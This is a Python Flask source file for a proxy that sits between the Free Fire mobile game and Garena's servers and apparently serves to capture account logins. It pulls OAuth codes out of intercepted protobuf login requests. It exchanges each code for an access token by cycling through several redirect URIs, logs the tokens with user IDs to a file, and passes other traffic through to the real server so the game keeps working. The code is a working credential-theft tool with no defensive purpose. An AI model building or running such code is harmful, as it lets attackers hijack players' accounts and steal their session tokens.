from flask import Flask, request, jsonify, Response
import requests
import os
import re
from datetime import datetime

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"

# List of possible redirect_uri values – we'll try each until one works
REDIRECT_URIS = [
    "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/",
    "https://shop.garena.sg/app/100067/idlogin",
    "https://gameskharido.in/app/100067/idlogin",
    "https://shop2game.com/app/100067/login",
    "https://api.ff.garena.co.id/auth/auth/callback_n",
    "https://api.ff.garena.co.id/auth/auth/callback",
]

active_users = []
# ─────────────────────────────────────────────────────────────────

# ─── RECURSIVE PROTOBUF PARSER ──────────────────────────────────
def read_varint(data, offset):
    result = 0
    shift = 0
    while True:
        b = data[offset]
        result |= (b & 0x7f) << shift
        offset += 1
        if not (b & 0x80):
            break
        shift += 7
    return result, offset

def parse_protobuf(data, offset=0):
    """
    Recursively parse a protobuf message and return a list of all string values.
    """
    strings = []
    data_len = len(data)
    while offset < data_len:
        try:
            tag, offset = read_varint(data, offset)
            wire_type = tag & 0x07
            if wire_type == 2:  # length-delimited (string, bytes, nested)
                length, offset = read_varint(data, offset)
                if length > 0 and offset + length <= data_len:
                    value = data[offset:offset+length]
                    # Try to decode as UTF-8 string
                    try:
                        s = value.decode('utf-8')
                        strings.append(s)
                    except UnicodeDecodeError:
                        # Not a valid string – treat as nested message and recurse
                        nested_strings = parse_protobuf(value)
                        strings.extend(nested_strings)
                    offset += length
                else:
                    break
            elif wire_type == 0:  # varint
                _, offset = read_varint(data, offset)
            elif wire_type == 1:  # 64-bit
                offset += 8
            elif wire_type == 5:  # 32-bit
                offset += 4
            else:
                # Unknown wire type – stop
                break
        except Exception as e:
            print(f"Protobuf parse error: {e}")
            break
    return strings

def extract_oauth_code(raw_data):
    """
    Extract OAuth code from the raw protobuf data.
    First, get all strings from the protobuf, then filter for OAuth code pattern.
    """
    all_strings = parse_protobuf(raw_data)
    # Search for a string that matches OAuth code pattern (30-60 chars, alphanumeric with -_ .)
    code_pattern = re.compile(r'^[a-zA-Z0-9_\-\.]{30,60}$')
    for s in all_strings:
        if code_pattern.match(s) and not s.isdigit():
            return s
    return None

# ─── MULTI-URI EXCHANGE FUNCTION ──────────────────────────────
def exchange_code_for_tokens(code):
    """
    Try exchanging the OAuth code with multiple redirect_uri values.
    Returns the hex access token if any succeeds, otherwise None.
    """
    for uri in REDIRECT_URIS:
        payload = {
            "grant_type": "authorization_code",
            "code": code,
            "client_id": CLIENT_ID,
            "redirect_uri": uri
        }
        try:
            resp = requests.post(TOKEN_URL, data=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                hex_token = data.get('access_token')
                if hex_token:
                    print(f"✅ Exchange successful with redirect_uri: {uri}")
                    return hex_token
            else:
                print(f"❌ Exchange failed with {uri}: {resp.status_code}")
        except Exception as e:
            print(f"⚠️ Error with {uri}: {e}")
    return None

# ─── ROUTES ─────────────────────────────────────────────────────
@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        oauth_code = extract_oauth_code(raw_data)
        if oauth_code:
            print(f"🔑 Extracted OAuth code: {oauth_code[:20]}...")
            hex_token = exchange_code_for_tokens(oauth_code)
            if hex_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
                # Return success with token (optional)
                return jsonify({"status": "success", "access_token": hex_token}), 200
            else:
                print("❌ All exchange attempts failed.")
        else:
            print("⚠️ No OAuth code found in request.")
            # Print hex preview for debugging
            hex_preview = raw_data[:300].hex()
            print(f"📋 Hex preview (300): {hex_preview}")

        # Always return a success response to keep the game happy
        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests to the real Garena server
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)